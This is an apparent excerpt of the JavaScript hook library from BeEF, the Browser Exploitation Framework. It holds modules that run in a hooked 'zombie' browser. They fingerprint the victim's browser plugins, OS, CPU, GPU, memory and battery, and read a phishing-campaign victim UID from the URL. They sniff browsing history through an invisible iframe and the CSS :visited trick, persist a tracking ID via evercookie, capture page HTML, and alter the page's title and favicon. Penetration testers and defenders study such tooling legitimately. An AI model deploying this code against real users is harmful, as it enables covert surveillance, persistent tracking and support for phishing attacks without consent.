        if (has_silverlight)
            details['browser.capabilities.silverlight'] = has_silverlight;
        if (has_phonegap)
            details['browser.capabilities.phonegap'] = has_phonegap;
        if (has_web_socket)
            details['browser.capabilities.websocket'] = has_web_socket;
        if (has_webrtc)
            details['browser.capabilities.webrtc'] = has_webrtc;
        if (has_web_worker)
            details['browser.capabilities.webworker'] = has_web_worker;
        if (has_web_gl)
            details['browser.capabilities.webgl'] = has_web_gl;
        if (has_googlegears)
            details['browser.capabilities.googlegears'] = has_googlegears;
        if (has_activex)
            details['browser.capabilities.activex'] = has_activex;
        if (has_quicktime)
            details['browser.capabilities.quicktime'] = has_quicktime;
        if (has_realplayer)
            details['browser.capabilities.realplayer'] = has_realplayer;
        if (has_wmp)
            details['browser.capabilities.wmp'] = has_wmp;
        if (has_vlc)
            details['browser.capabilities.vlc'] = has_vlc;

        var pf_integration = "";
        if (pf_integration) {
            var pf_param = "uid";
            var pf_victim_uid = "";
            var location_search = window.location.search.substring(1);
            var params = location_search.split('&');
            for (var i = 0; i < params.length; i++) {
                var param_entry = params[i].split('=');
                if (param_entry[0] == pf_param) {
                    pf_victim_uid = param_entry[1];
                    details['PhishingFrenzyUID'] = pf_victim_uid;
                    break;
                }
            }
        } else {
            details['PhishingFrenzyUID'] = "N/A";
        }

        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX: function() {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports WebRTC
     */
    hasWebRTC: function() {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight: function() {
        var result = false;

        try {
            if (beef.browser.hasActiveX()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited: function(urls) {
        var results = new Array();
        var iframe = beef.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({
                    'url': u,
                    'visited': success
                });
                count++;
            }
        }
        beef.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket: function() {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Web Workers enabled.
     * @return: {Boolean} true or false.
     * */
    hasWebWorker: function() {
        return (typeof (Worker) !== "undefined");
    },

    /**
     * Checks if the zombie has WebGL enabled.
     * @return: {Boolean} true or false.
     *
     * @from: https://github.com/idofilin/webgl-by-example/blob/master/detect-webgl/detect-webgl.js
     * */
    hasWebGL: function() {
        try {
            var canvas = document.createElement("canvas");
            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            return !!(gl && gl instanceof WebGLRenderingContext);
        } catch (e) {
            return false;
        }
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears: function() {

        var ggfactory = null;

        // Chrome
        if (window.google && google.gears)
            return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined') && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined'))
                        ggfactory = null;
                }
            }
        }
        if (!ggfactory)
            return false;
        else
            return true;
    },

    /**
     * Checks if the zombie has Foxit PDF reader plugin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFoxit()) { ... }
     * */
    hasFoxit: function() {

        var foxitplugin = false;

        try {
            if (beef.browser.hasActiveX()) {
                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                foxitplugin = true;
            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
                foxitplugin = true;
            }
        } catch (e) {
            foxitplugin = false;
        }

        return foxitplugin;
    },

    /**
     * Returns the page head HTML
     **/
    getPageHead: function() {
        var html_head;
        try {
            html_head = document.head.innerHTML.toString();
        } catch (e) {}
        return html_head;
    },

    /**
     * Returns the page body HTML
     **/
    getPageBody: function() {
        var html_body;
        try {
            html_body = document.body.innerHTML.toString();
        } catch (e) {}
        return html_body;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon: function(favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link')
          , oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink)
            document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC())
            iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle: function(title) {
        document.title = title;
    },

    /**
     * Get the browser language
     */
    getBrowserLanguage: function() {
        var l = 'Unknown';
        try {
            l = window.navigator.userLanguage || window.navigator.language;
        } catch (e) {}
        return l;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per origin, or globally on all origin.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     *
     *    example usage:
     *        $j.when(getMaxConnections()).done(function(){
     *            console.debug("Max Connections: " + this);
     *            });
     *
     */
    getMaxConnections: function(scope) {

        var imagesCount = 30;
        // Max number of images to test
        var secondsTimeout = 5;
        // Image load timeout threashold
        var testUrl = "";
        // The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
        else
            // The token will be replaced by a different number with each request (different origin).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";

        var imagesLoaded = 0;
        // Number of responding images before timeout.
        var imagesRequested = 0;
        // Number of requested images.
        var testImages = new Array();
        // Array of all images.
        var deferredObject = $j.Deferred();
        // A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] = $j.ajax({
                type: "get",
                dataType: true,
                url: (testUrl.replace("<token>", i)) + Math.random(),
                data: "",
                timeout: (secondsTimeout * 1000),

                // Function on completion of request.
                complete: function(jqXHR, textStatus) {

                    imagesRequested++;

                    // If the image returns a 200 or a 302, the text Status is "error", else null
                    if (textStatus == "error") {
                        imagesLoaded++;
                    }

                    // If all images requested
                    if (imagesRequested >= imagesCount) {
                        // resolve the deferred object passing the number of loaded images.
                        deferredObject.resolveWith(imagesLoaded);
                    }
                }
            });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }

};

beef.regCmp('beef.browser');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.browser.cookie
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://techpatterns.com/downloads/javascript_cookies.php
 * Original author unknown.
 * 
 */
beef.browser.cookie = {

    setCookie: function(name, value, expires, path, domain, secure) {

        var today = new Date();
        today.setTime(today.getTime());

        if (expires) {
            expires = expires * 1000 * 60 * 60 * 24;
        }
        var expires_date = new Date(today.getTime() + (expires));

        document.cookie = name + "=" + escape(value) + ((expires) ? ";expires=" + expires_date.toGMTString() : "") + ((path) ? ";path=" + path : "") + ((domain) ? ";domain=" + domain : "") + ((secure) ? ";secure" : "");
    },

    getCookie: function(name) {
        var a_all_cookies = document.cookie.split(';');
        var a_temp_cookie = '';
        var cookie_name = '';
        var cookie_value = '';
        var b_cookie_found = false;

        for (i = 0; i < a_all_cookies.length; i++) {
            a_temp_cookie = a_all_cookies[i].split('=');
            cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
            if (cookie_name == name) {
                b_cookie_found = true;
                if (a_temp_cookie.length > 1) {
                    cookie_value = unescape(a_temp_cookie[1].replace(/^\s+|\s+$/g, ''));
                }
                return cookie_value;
                break;
            }
            a_temp_cookie = null;
            cookie_name = '';
        }
        if (!b_cookie_found) {
            return null;
        }
    },

    deleteCookie: function(name, path, domain) {
        if (this.getCookie(name))
            document.cookie = name + "=" + ((path) ? ";path=" + path : "") + ((domain) ? ";domain=" + domain : "") + ";expires=Thu, 01-Jan-1970 00:00:01 GMT";
    },

    /* Never stop the madness dear C. */
    veganLol: function() {
        var to_hell = '';
        var min = 17;
        var max = 25;
        var lol_length = Math.floor(Math.random() * (max - min + 1)) + min;

        var grunt = function() {
            var moo = Math.floor(Math.random() * 62);
            var char = '';
            if (moo < 36) {
                char = String.fromCharCode(moo + 55);
            } else {
                char = String.fromCharCode(moo + 61);
            }
            if (char != ';' && char != '=') {
                return char;
            } else {
                return 'x';
            }
        };

        while (to_hell.length < lol_length) {
            to_hell += grunt();
        }
        return to_hell;
    },

    hasSessionCookies: function(name) {
        this.setCookie(name, beef.browser.cookie.veganLol(), '', '/', '', '');

        cookiesEnabled = (this.getCookie(name) == null) ? false : true;
        this.deleteCookie(name, '/', '');
        return cookiesEnabled;

    },

    hasPersistentCookies: function(name) {
        this.setCookie(name, beef.browser.cookie.veganLol(), 1, '/', '', '');

        cookiesEnabled = (this.getCookie(name) == null) ? false : true;
        this.deleteCookie(name, '/', '');
        return cookiesEnabled;

    }

};

beef.regCmp('beef.browser.cookie');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.browser.popup
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://davidwalsh.name/popup-block-javascript
 * Original author unknown.
 * 
 */
beef.browser.popup = {

    blocker_enabled: function() {
        screenParams = beef.hardware.getScreenSize();
        var popUp = window.open('/', 'windowName0', 'width=1, height=1, left=' + screenParams.width + ', top=' + screenParams.height + ', scrollbars, resizable');
        if (popUp == null || typeof (popUp) == 'undefined') {
            return true;
        } else {
            popUp.close();
            return false;
        }
    }
};

beef.regCmp('beef.browser.popup');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.session
 *
 * Provides basic session functions.
 */
beef.session = {

    hook_session_id_length: 80,
    hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    ec: new evercookie(),
    beefhook: "BEEFHOOK",

    /**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
    get_hook_session_id: function() {
        // check if the browser is already known to the framework
        var id = this.ec.evercookie_cookie(beef.session.beefhook);
        if (typeof id == 'undefined') {
            var id = this.ec.evercookie_userdata(beef.session.beefhook);
        }
        if (typeof id == 'undefined') {
            var id = this.ec.evercookie_window(beef.session.beefhook);
        }

        // if the browser is not known create a hook session id and set it
        if ((typeof id == 'undefined') || (id == null)) {
            id = this.gen_hook_session_id();
            this.set_hook_session_id(id);
        }

        // return the hooked browser session identifier
        return id;
    },

    /**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
    set_hook_session_id: function(id) {
        // persist the hook session id
        this.ec.evercookie_cookie(beef.session.beefhook, id);
        this.ec.evercookie_userdata(beef.session.beefhook, id);
        this.ec.evercookie_window(beef.session.beefhook, id);
    },

    /**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
    gen_hook_session_id: function() {
        // init the return value
        var hook_session_id = "";

        // construct the random string 
        for (var i = 0; i < this.hook_session_id_length; i++) {
            var rand_num = Math.floor(Math.random() * this.hook_session_id_chars.length);
            hook_session_id += this.hook_session_id_chars.charAt(rand_num);
        }

        return hook_session_id;
    }
};

beef.regCmp('beef.session');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.os = {

    ua: navigator.userAgent,

    /**
	  * Detect default browser (IE only)
	  * Written by unsticky
	  * http://ha.ckers.org/blog/20070319/detecting-default-browser-in-ie/
	  */
    getDefaultBrowser: function() {
        var result = "Unknown"
        try {
            var mt = document.mimeType;
            if (mt) {
                if (mt == "Safari Document")
                    result = "Safari";
                if (mt == "Firefox HTML Document")
                    result = "Firefox";
                if (mt == "Chrome HTML Document")
                    result = "Chrome";
                if (mt == "HTML Document")
                    result = "Internet Explorer";
                if (mt == "Opera Web Document")
                    result = "Opera";
            }
        } catch (e) {
            beef.debug("[os] getDefaultBrowser: " + e.message);
        }
        return result;
    },

    // the likelihood that we hook Windows 3.11 (which has only Win in the UA string) is zero in 2015
    isWin311: function() {
        return (this.ua.match('(Win16)')) ? true : false;
    },

    isWinNT4: function() {
        return (this.ua.match('(Windows NT 4.0)')) ? true : false;
    },

    isWin95: function() {
        return (this.ua.match('(Windows 95)|(Win95)|(Windows_95)')) ? true : false;
    },
    isWinCE: function() {
        return (this.ua.match('(Windows CE)')) ? true : false;
    },

    isWin98: function() {
        return (this.ua.match('(Windows 98)|(Win98)')) ? true : false;
    },

    isWinME: function() {
        return (this.ua.match('(Windows ME)|(Win 9x 4.90)')) ? true : false;
    },

    isWin2000: function() {
        return (this.ua.match('(Windows NT 5.0)|(Windows 2000)')) ? true : false;
    },

    isWin2000SP1: function() {
        return (this.ua.match('Windows NT 5.01 ')) ? true : false;
    },

    isWinXP: function() {
        return (this.ua.match('(Windows NT 5.1)|(Windows XP)')) ? true : false;
    },

    isWinServer2003: function() {
        return (this.ua.match('(Windows NT 5.2)')) ? true : false;
    },

    isWinVista: function() {
        return (this.ua.match('(Windows NT 6.0)')) ? true : false;
    },

    isWin7: function() {
        return (this.ua.match('(Windows NT 6.1)|(Windows NT 7.0)')) ? true : false;
    },

    isWin8: function() {
        return (this.ua.match('(Windows NT 6.2)')) ? true : false;
    },

    isWin81: function() {
        return (this.ua.match('(Windows NT 6.3)')) ? true : false;
    },

    isWin10: function() {
        return (this.ua.match('Windows NT 10.0')) ? true : false;
    },

    isOpenBSD: function() {
        return (this.ua.indexOf('OpenBSD') != -1) ? true : false;
    },

    isSunOS: function() {
        return (this.ua.indexOf('SunOS') != -1) ? true : false;
    },

    isLinux: function() {
        return (this.ua.match('(Linux)|(X11)')) ? true : false;
    },

    isMacintosh: function() {
        return (this.ua.match('(Mac_PowerPC)|(Macintosh)|(MacIntel)')) ? true : false;
    },

    isOsxYosemite: function() {
        // TODO
        return (this.ua.match('(OS X 10_10)|(OS X 10.10)')) ? true : false;
    },
    isOsxMavericks: function() {
        // TODO
        return (this.ua.match('(OS X 10_9)|(OS X 10.9)')) ? true : false;
    },
    isOsxSnowLeopard: function() {
        // TODO
        return (this.ua.match('(OS X 10_8)|(OS X 10.8)')) ? true : false;
    },
    isOsxLeopard: function() {
        // TODO
        return (this.ua.match('(OS X 10_7)|(OS X 10.7)')) ? true : false;
    },

    isWinPhone: function() {
        return (this.ua.match('(Windows Phone)')) ? true : false;
    },

    isIphone: function() {
        return (this.ua.indexOf('iPhone') != -1) ? true : false;
    },

    isIpad: function() {
        return (this.ua.indexOf('iPad') != -1) ? true : false;
    },

    isIpod: function() {
        return (this.ua.indexOf('iPod') != -1) ? true : false;
    },

    isNokia: function() {
        return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
    },

    isAndroid: function() {
        return (this.ua.match('Android')) ? true : false;
    },

    isBlackBerry: function() {
        return (this.ua.match('BlackBerry')) ? true : false;
    },

    isWebOS: function() {
        return (this.ua.match('webOS')) ? true : false;
    },

    isQNX: function() {
        return (this.ua.match('QNX')) ? true : false;
    },

    isBeOS: function() {
        return (this.ua.match('BeOS')) ? true : false;
    },

    isAros: function() {
        return (this.ua.match('AROS')) ? true : false;
    },

    isWindows: function() {
        return (this.ua.match('Windows')) ? true : false;
    },

    getName: function() {

        if (this.isWindows()) {
            return 'Windows';
        }

        if (this.isMacintosh()) {
            return 'OSX';
        }

        //Nokia
        if (this.isNokia()) {
            if (this.ua.indexOf('Maemo Browser') != -1)
                return 'Maemo';
            if (this.ua.match('(SymbianOS)|(Symbian OS)'))
                return 'SymbianOS';
            if (this.ua.indexOf('Symbian') != -1)
                return 'Symbian';
        }

        // BlackBerry
        if (this.isBlackBerry())
            return 'BlackBerry OS';

        // Android
        if (this.isAndroid())
            return 'Android';

        // SunOS
        if (this.isSunOS())
            return 'SunOS';

        //Linux
        if (this.isLinux())
            return 'Linux';

        //iPhone
        if (this.isIphone())
            return 'iOS';
        //iPad
        if (this.isIpad())
            return 'iOS';
        //iPod
        if (this.isIpod())
            return 'iOS';

        //others
        if (this.isQNX())
            return 'QNX';
        if (this.isBeOS())
            return 'BeOS';
        if (this.isWebOS())
            return 'webOS';
        if (this.isAros())
            return 'AROS';

        return 'unknown';
    },

    /**
    * Get OS architecture.
    * This may not be the same as the browser arch or CPU arch.
    * ie, 32bit OS on 64bit hardware
    */
    getArch: function() {
        var arch = 'unknown';
        try {
            var arch = platform.os.architecture;
            if (!!arch)
                return arch;
        } catch (e) {}

        return arch;
    },

    /**
    * Get OS family
    */
    getFamily: function() {
        var family = 'unknown';
        try {
            var family = platform.os.family;
            if (!!family)
                return family;
        } catch (e) {}

        return arch;
    },

    /**
    * Get OS name
    */
    getVersion: function() {
        //Windows
        if (this.isWindows()) {
            if (this.isWin10())
                return '10';
            if (this.isWin81())
                return '8.1';
            if (this.isWin8())
                return '8';
            if (this.isWin7())
                return '7';
            if (this.isWinVista())
                return 'Vista';
            if (this.isWinXP())
                return 'XP';
            if (this.isWinServer2003())
                return 'Server 2003';
            if (this.isWin2000SP1())
                return '2000 SP1';
            if (this.isWin2000())
                return '2000';
            if (this.isWinME())
                return 'Millenium';

            if (this.isWinNT4())
                return 'NT 4';
            if (this.isWinCE())
                return 'CE';
            if (this.isWin95())
                return '95';
            if (this.isWin98())
                return '98';
        }

        // OS X
        if (this.isMacintosh()) {
            if (this.isOsxYosemite())
                return '10.10';
            if (this.isOsxMavericks())
                return '10.9';
            if (this.isOsxSnowLeopard())
                return '10.8';
            if (this.isOsxLeopard())
                return '10.7';
        }

        // TODO add Android/iOS version detection
    }
};

beef.regCmp('beef.net.os');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.hardware = {

    ua: navigator.userAgent,

    /*
   * @return: {String} CPU type
   **/
    getCpuArch: function() {
        var arch = 'UNKNOWN';
        // note that actually WOW64 means IE 32bit and Windows 64 bit. we are more interested
        // in detecting the OS arch rather than the browser build
        if (navigator.userAgent.match('(WOW64|x64|x86_64)') || navigator.platform.toLowerCase() == "win64") {
            arch = 'x86_64';
        } else if (typeof navigator.cpuClass != 'undefined') {
            switch (navigator.cpuClass) {
            case '68K':
                arch = 'Motorola 68K';
                break;
            case 'PPC':
                arch = 'Motorola PPC';
                break;
            case 'Digital':
                arch = 'Alpha';
                break;
            default:
                arch = 'x86';
            }
        }
        // TODO we can infer the OS is 64 bit, if we first detect the OS type (os.js).
        // For example, if OSX is at least 10.7, most certainly is 64 bit.
        return arch;
    },

    /**
   * Returns number of CPU cores
   **/
    getCpuCores: function() {
        var cores = 'unknown';
        try {
            if (typeof navigator.hardwareConcurrency != 'undefined') {
                cores = navigator.hardwareConcurrency;
            }
        } catch (e) {
            cores = 'unknown';
        }
        return cores;
    },

    /**
   * Returns CPU details
   **/
    getCpuDetails: function() {
        return {
            arch: beef.hardware.getCpuArch(),
            cores: beef.hardware.getCpuCores()
        }
    },

    /**
   * Returns GPU details
   **/
    getGpuDetails: function() {
        var gpu = 'unknown';
        var vendor = 'unknown';
        // use canvas technique:
        // https://github.com/Valve/fingerprintjs2
        // http://codeflow.org/entries/2016/feb/10/webgl_debug_renderer_info-extension-survey-results/
        try {
            var getWebglCanvas = function() {
                var canvas = document.createElement('canvas')
                var gl = null
                try {
                    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
                } catch (e) {}
                if (!gl) {
                    gl = null
                }
                return gl;
            }

            var glContext = getWebglCanvas();
            var extensionDebugRendererInfo = glContext.getExtension('WEBGL_debug_renderer_info');
            var gpu = glContext.getParameter(extensionDebugRendererInfo.UNMASKED_RENDERER_WEBGL);
            var vendor = glContext.getParameter(extensionDebugRendererInfo.UNMASKED_VENDOR_WEBGL);
            beef.debug("GPU: " + gpu + " - Vendor: " + vendor);
        } catch (e) {
            beef.debug('Failed to detect WebGL renderer: ' + e.toString());
        }
        return {
            gpu: gpu,
            vendor: vendor
        }
    },

    /**
   * Returns RAM (GiB)
   **/
    getMemory: function() {
        var memory = 'unknown';
        try {
            if (typeof navigator.deviceMemory != 'undefined') {
                memory = navigator.deviceMemory;
            }
        } catch (e) {
            memory = 'unknown';
        }
        return memory;
    },

    /**
   * Returns battery details
   **/
    getBatteryDetails: function() {
        var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery;

        if (!!battery) {
            return {
                chargingStatus: battery.charging,
                batteryLevel: battery.level * 100 + "%",
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            }
        } else {
            return {
                chargingStatus: 'unknown',
                batteryLevel: 'unknown',
                chargingTime: 'unknown',
                dischargingTime: 'unknown'
            }
        }
    },

    /**
   * Returns zombie screen size and color depth.
   */
    getScreenSize: function() {
        return {
            width: window.screen.width,
            height: window.screen.height,
            colordepth: window.screen.colorDepth
        }
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isTouchEnabled: function() {
        if ('ontouchstart'in document)
            return true;
        return false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isVirtualMachine: function() {
        if (this.getGpuDetails().vendor.match('VMware, Inc'))
            return true;

        if (this.isMobileDevice())
            return false;

        // if the screen resolution is uneven, and it's not a known mobile device
        // then it's probably a VM
        if (screen.width % 2 || screen.height % 2)
            return true;

        return false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isLaptop: function() {
        if (this.isMobileDevice())
            return false;
        // Most common laptop screen resolution
        if (screen.width == 1366 && screen.height == 768)
            return true;
        // Netbooks
        if (screen.width == 1024 && screen.height == 600)
            return true;
        return false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isNokia: function() {
        return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)|(Lumia )')) ? true : false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isZune: function() {
        return (this.ua.match('ZuneWP7')) ? true : false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isHtc: function() {
        return (this.ua.match('HTC')) ? true : false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isEricsson: function() {
        return (this.ua.match('Ericsson')) ? true : false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isMotorola: function() {
        return (this.ua.match('Motorola')) ? true : false;
    },

    /*
   * @return: {Boolean} true or false.
   **/
    isGoogle: function() {
        return (this.ua.match('Nexus One')) ? true : false;
    },

    /**
   * Returns true if the browser is on a Mobile device
   * @return: {Boolean} true or false
   *
   * @example: if(beef.hardware.isMobileDevice()) { ... }
   **/
    isMobileDevice: function() {
        return MobileEsp.DetectMobileQuick();
    },

    /**
   * Returns true if the browser is on a game console
   * @return: {Boolean} true or false
   *
   * @example: if(beef.hardware.isGameConsole()) { ... }
   **/
    isGameConsole: function() {
        return MobileEsp.DetectGameConsole();
    },

    getName: function() {
        var ua = navigator.userAgent.toLowerCase();
        if (MobileEsp.DetectIphone()) {
            return "iPhone"
        }
        ;if (MobileEsp.DetectIpod()) {
            return "iPod Touch"
        }
        ;if (MobileEsp.DetectIpad()) {
            return "iPad"
        }
        ;if (this.isHtc()) {
            return 'HTC'
        }
        ;if (this.isMotorola()) {
            return 'Motorola'
        }
        ;if (this.isZune()) {
            return 'Zune'
        }
        ;if (this.isGoogle()) {
            return 'Google Nexus One'
        }
        ;if (this.isEricsson()) {
            return 'Ericsson'
        }
        ;if (MobileEsp.DetectAndroidPhone()) {
            return "Android Phone"
        }
        ;if (MobileEsp.DetectAndroidTablet()) {
            return "Android Tablet"
        }
        ;if (MobileEsp.DetectS60OssBrowser()) {
            return "Nokia S60 Open Source"
        }
        ;if (ua.search(MobileEsp.deviceS60) > -1) {
            return "Nokia S60"
        }
        ;if (ua.search(MobileEsp.deviceS70) > -1) {
            return "Nokia S70"
        }
        ;if (ua.search(MobileEsp.deviceS80) > -1) {
            return "Nokia S80"
        }
        ;if (ua.search(MobileEsp.deviceS90) > -1) {
            return "Nokia S90"
        }
        ;if (ua.search(MobileEsp.deviceSymbian) > -1) {
            return "Nokia Symbian"
        }
        ;if (this.isNokia()) {
            return 'Nokia'
        }
        ;if (MobileEsp.DetectWindowsPhone7()) {
            return "Windows Phone 7"
        }
        ;if (MobileEsp.DetectWindowsPhone8()) {
            return "Windows Phone 8"
        }
        ;if (MobileEsp.DetectWindowsPhone10()) {
            return "Windows Phone 10"
        }
        ;if (MobileEsp.DetectWindowsMobile()) {
            return "Windows Mobile"
        }
        ;if (MobileEsp.DetectBlackBerryTablet()) {
            return "BlackBerry Tablet"
        }
        ;if (MobileEsp.DetectBlackBerryWebKit()) {
            return "BlackBerry OS 6"
        }
        ;if (MobileEsp.DetectBlackBerryTouch()) {
            return "BlackBerry Touch"
        }
        ;if (MobileEsp.DetectBlackBerryHigh()) {
            return "BlackBerry OS 5"
        }
        ;if (MobileEsp.DetectBlackBerry()) {
            return "BlackBerry"
        }
        ;if (MobileEsp.DetectPalmOS()) {
            return "Palm OS"
        }
        ;if (MobileEsp.DetectPalmWebOS()) {
            return "Palm Web OS"
        }
        ;if (MobileEsp.DetectGarminNuvifone()) {
            return "Gamin Nuvifone"
        }
        ;if (MobileEsp.DetectArchos()) {
            return "Archos"
        }
        if (MobileEsp.DetectBrewDevice()) {
            return "Brew"
        }
        ;if (MobileEsp.DetectDangerHiptop()) {
            return "Danger Hiptop"
        }
        ;if (MobileEsp.DetectMaemoTablet()) {
            return "Maemo Tablet"
        }
        ;if (MobileEsp.DetectSonyMylo()) {
            return "Sony Mylo"
        }
        ;if (MobileEsp.DetectAmazonSilk()) {
            return "Kindle Fire"
        }
        ;if (MobileEsp.DetectKindle()) {
            return "Kindle"
        }
        ;if (MobileEsp.DetectSonyPlaystation()) {
            return "Playstation"
        }
        ;if (ua.search(MobileEsp.deviceNintendoDs) > -1) {
            return "Nintendo DS"
        }
        ;if (ua.search(MobileEsp.deviceWii) > -1) {
            return "Nintendo Wii"
        }
        ;if (ua.search(MobileEsp.deviceNintendo) > -1) {
            return "Nintendo"
        }
        ;if (MobileEsp.DetectXbox()) {
            return "Xbox"
        }
        ;if (this.isLaptop()) {
            return "Laptop"
        }
        ;if (this.isVirtualMachine()) {
            return "Virtual Machine"
        }
        ;
        return 'Unknown';
    }
};

beef.regCmp('beef.hardware');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.dom
 *
 * Provides functionality to manipulate the DOM.
 */
beef.dom = {

    /**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "beef-"
	 * @return: generated id
	 */
    generateID: function(prefix) {
        return ((prefix == null) ? 'beef-' : prefix) + Math.floor(Math.random() * 99999);
    },

    /**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
    createElement: function(type, attributes) {
        var el = document.createElement(type);

        for (index in attributes) {
            if (typeof attributes[index] == 'string') {
                el.setAttribute(index, attributes[index]);
            }
        }

        return el;
    },

    /**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
    removeElement: function(el) {
        if (!beef.dom.isDOMElement(el)) {
            el = document.getElementById(el);
        }
        try {
            el.parentNode.removeChild(el);
        } catch (e) {}
    },

    /**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
    isDOMElement: function(obj) {
